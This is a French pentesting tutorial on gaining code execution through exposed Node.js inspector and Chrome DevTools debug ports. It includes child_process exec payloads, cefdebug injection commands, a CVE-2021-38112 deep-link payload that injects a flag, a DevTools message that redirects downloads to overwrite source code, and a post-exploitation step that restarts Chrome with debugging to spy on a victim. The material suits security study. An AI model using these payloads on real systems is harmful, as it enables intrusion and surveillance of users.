# Abus du debug de Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started) : Lorsqu’il est démarré avec l’option `--inspect`, un processus Node.js écoute un client de debugging. Par **défaut**, il écoute sur l’hôte et le port **`127.0.0.1:9229`**. Un **UUID** **unique** est également attribué à chaque processus.

Les clients Inspector doivent connaître et spécifier l’adresse de l’hôte, le port et l’UUID pour se connecter. Une URL complète ressemblera à ceci : `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Comme le **debugger dispose d’un accès complet à l’environnement d’exécution Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d’exécuter du code arbitraire au nom du processus Node.js (**élévation de privilèges potentielle**).

Il existe plusieurs façons de démarrer un Inspector :
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Lorsque vous démarrez un processus inspecté, quelque chose comme ceci apparaîtra :
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Les processus basés sur **CEF** (**Chromium Embedded Framework**), comme Electron, nécessitent l’utilisation du paramètre `--remote-debugging-port=9222` pour ouvrir le **debugger** (les protections contre les **SSRF** restent très similaires). Cependant, au lieu d’accorder une session de **debug** **NodeJS**, ils communiquent avec le navigateur à l’aide du [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/). Il s’agit d’une interface permettant de contrôler le navigateur, mais il n’y a pas de **RCE** directe.

Lorsque vous démarrez un navigateur en mode **debug**, quelque chose comme ceci apparaît :
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets et same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites Web ouverts dans un navigateur Web peuvent effectuer des requêtes WebSocket et HTTP selon le modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session unique du debugger**. La **same-origin-policy** **empêche** les sites Web d'établir **cette connexion HTTP**. Pour renforcer la sécurité contre les [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js vérifie que les **en-têtes 'Host'** de la connexion spécifient soit une **adresse IP**, soit **`localhost`**, soit **`localhost6`**, exactement.

> [!TIP]
> Cette **mesure de sécurité empêche d'exploiter l'inspector** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait être fait en exploitant une SSRF vuln).

### Démarrer l'inspector dans des processus en cours d'exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus nodejs en cours d'exécution pour lui faire **démarrer l'inspector** sur le port par défaut. Cependant, notez que vous devez disposer de privilèges suffisants ; cela peut donc vous accorder un **accès privilégié aux informations contenues dans le processus**, mais pas une élévation directe de privilèges.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Cela est utile dans les containers, car **arrêter le processus et en démarrer un nouveau** avec `--inspect` **n'est pas une option**, puisque le **container** sera **tué** avec le processus.

### Se connecter à l'inspector/debugger

Pour se connecter à un **navigateur basé sur Chromium**, les URLs `chrome://inspect` ou `edge://inspect` peuvent être utilisées respectivement pour Chrome ou Edge. En cliquant sur le bouton Configure, il faut s'assurer que le **target host et le port** sont correctement indiqués. L'image montre un exemple de Remote Code Execution (RCE) :

![Après une URL permettant d'accéder au debugger apparaîtra. Par exemple : ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Se connecter à l'inspector/debugger : Pour se connecter à un navigateur basé sur Chromium, ...](<../../images/image (674).png>)

À l'aide de la **ligne de commande**, vous pouvez vous connecter à un debugger/inspector avec :
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
L'outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permet de **trouver les inspecteurs** exécutés localement et d'y **injecter du code**.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Notez que les exploits **RCE** de **NodeJS** ne fonctionneront pas si vous êtes connecté à un navigateur via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez consulter l'API pour trouver des choses intéressantes à faire avec).

## RCE dans le Debugger/Inspector de NodeJS

> [!TIP]
> Si vous êtes arrivé ici en cherchant comment obtenir une [**RCE à partir d'une XSS dans Electron, consultez cette page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Voici quelques méthodes courantes pour obtenir une **RCE** lorsque vous pouvez vous **connecter** à un **inspector** Node, en utilisant quelque chose comme ceci (il semble que cela **ne fonctionnera pas avec une connexion au Chrome DevTools protocol**) :
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads du Chrome DevTools Protocol

Vous pouvez consulter l’API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Dans cette section, je vais simplement répertorier les éléments intéressants que j’ai trouvés et que des personnes ont utilisés pour exploiter ce protocole.

### Injection de paramètres via des Deep Links

Dans le cadre de la [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security a découvert qu’une application basée sur CEF **avait enregistré une UR**I personnalisée dans le système (workspaces://index.html), qui recevait l’URI complète, puis **lançait l’applicatio**n basée sur CEF avec une configuration partiellement construite à partir de cette URI.

Il a été découvert que les paramètres de l’URI étaient décodés au format URL et utilisés pour lancer l’application de base CEF, ce qui permettait à un utilisateur d’**injecter** le flag **`--gpu-launcher`** dans la **ligne de commande** et d’exécuter des actions arbitraires.

Ainsi, un payload tel que :
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Exécutera calc.exe.

### Écraser des fichiers

Modifiez le dossier où les **fichiers téléchargés vont être enregistrés** et téléchargez un fichier afin **d’écraser** fréquemment utilisé **code source** de l’application avec votre **code malveillant**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

Selon cet article : [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), il est possible d'obtenir une RCE et d'exfiltrer des pages internes depuis theriver.

### Post-Exploitation

Dans un environnement réel et **après avoir compromis** le PC d'un utilisateur qui utilise un navigateur basé sur Chrome/Chromium, vous pourriez lancer un processus Chrome avec le **debugging activé et effectuer un port-forward du port de debugging** afin d'y accéder. De cette manière, vous pourrez **inspecter tout ce que la victime fait avec Chrome et voler des informations sensibles**.

La méthode furtive consiste à **terminer chaque processus Chrome**, puis à appeler quelque chose comme
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Références

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
